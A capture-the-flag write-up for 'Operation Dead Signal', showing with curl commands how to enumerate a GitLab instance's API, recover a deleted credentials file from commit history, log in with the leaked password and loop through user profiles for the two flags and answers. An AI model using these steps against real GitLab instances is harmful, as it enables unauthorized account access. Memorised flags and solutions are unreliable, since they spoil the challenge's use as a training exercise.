# Writeup — Operation Dead Signal

**Category:** OSINT / Web
**Difficulty:** Medium
**Flags:** 2
**Flag 1:** `CF2026{g1t_h1st0ry_n3v3r_l13s_4nd_n3v3r_f0rg3ts}`
**Flag 2:** `CF2026{3xp0s3d_pr0f1l3_d4t4_1s_4ls0_s3ns1t1v3}`

---

## Overview

A GitLab instance is exposed with no credentials provided to participants.
The challenge has two stages:

1. **Unauthenticated** — enumerate public repos, dig through commit history, recover Flag 1 and leaked credentials
2. **Authenticated** — use the leaked credentials to log in, enumerate user profiles via the API, find Flag 2 in a user's public email field

The core lesson: developers often "delete" sensitive data from repos without realising git history is permanent and publicly readable.

---

## Step 1 — Discover the GitLab API

Navigate to the target URL. A GitLab login page is presented with no credentials.

GitLab exposes a REST API at `/api/v4/`. Public endpoints require no authentication.

Enumerate public projects:

```bash
curl http://<target>/api/v4/projects?visibility=public
```

Response reveals one public repo: **`phobos-relay-config`** (project ID 1).

---

## Step 2 — Enumerate commit history

```bash
curl http://<target>/api/v4/projects/1/repository/commits
```

Five commits are returned, newest first:

```
c32902792758  chore: update network topology Q1-2026
96910dbddb56  ci: add automated relay sync pipeline
98521cb9de54  fix: remove credentials from version control — security finding #MDF-4421
0ff214452386  feat: add ops service account for automated relay sync
0e0922f0a37d  chore: initial repository scaffold
```

Commit `98521cb9de54` says **"remove credentials from version control"** — classic signal that something was committed and then deleted.

---

## Step 3 — Read the deleted commit diff

Inspect the commit *before* the deletion — `0ff214452386`:

```bash
curl http://<target>/api/v4/projects/1/repository/commits/0ff214452386/diff
```

The diff shows a file `config/ops-credentials.cfg` that was added:

```ini
# MDF Phobos Relay — Ops Service Account
# Created: 2026-01-09T02:41:17Z | Author: SIGINT-7
# WARNING: Rotate credentials after initial deployment

[service_account]
username = dax_mercer
password = D@xM3rc3r!Wn59kFuV
role     = ops-relay-sync

[deployment]
api_token = CF2026{g1t_h1st0ry_n3v3r_l13s_4nd_n3v3r_f0rg3ts}
target    = phobos-relay-03.mdf.local
region    = mars-north
```

**Flag 1:** `CF2026{g1t_h1st0ry_n3v3r_l13s_4nd_n3v3r_f0rg3ts}`

Also recovered: credentials for `dax_mercer` / `D@xM3rc3r!Wn59kFuV`

---

## Step 4 — Authenticate as dax_mercer

Use GitLab's OAuth password flow:

```bash
curl --request POST http://<target>/oauth/token \
  --data "grant_type=password&username=dax_mercer&password=D@xM3rc3r!Wn59kFuV"
```

Returns an `access_token`. Use it as a Bearer token on all subsequent requests.

---

## Step 5 — Enumerate users

The `/api/v4/users/:id` endpoint returns a user's public profile when authenticated.
The list endpoint (`/api/v4/users`) does NOT return `public_email` — you must query each user individually.

```bash
for i in $(seq 1 10); do
  curl -s http://<target>/api/v4/users/$i \
    -H "Authorization: Bearer <token>" | python3 -c \
    "import sys,json; d=json.load(sys.stdin); print(d['username'], d.get('public_email'))"
done
```

User ID 7 — `sable_rin` — returns:

```json
{
  "username": "sable_rin",
  "public_email": "CF2026{3xp0s3d_pr0f1l3_d4t4_1s_4ls0_s3ns1t1v3}@mdf.local",
  "bio": "MDF Signals Intelligence Operator | Phobos Station | clearance: UMBRA-3 | op-token: CF2026{3xp0s3d_pr0f1l3_d4t4_1s_4ls0_s3ns1t1v3}"
}
```

**Flag 2:** `CF2026{3xp0s3d_pr0f1l3_d4t4_1s_4ls0_s3ns1t1v3}`

---

## Key Concepts

| Concept | Detail |
|---------|--------|
| Git history is permanent | Deleting a file in a new commit does NOT remove it from history |
| GitLab API is unauthenticated for public repos | `/api/v4/projects`, `/repository/commits`, `/repository/commits/:sha/diff` |
| OAuth password grant | `POST /oauth/token` with `grant_type=password` |
| User profile enumeration | `GET /api/v4/users/:id` — `public_email` visible to authenticated users |
| `public_email` ≠ `email` | Only `public_email` is exposed to non-admin users via the API |

---

## Automated Solve

```bash
bash solution/solve.sh http://<target>
```
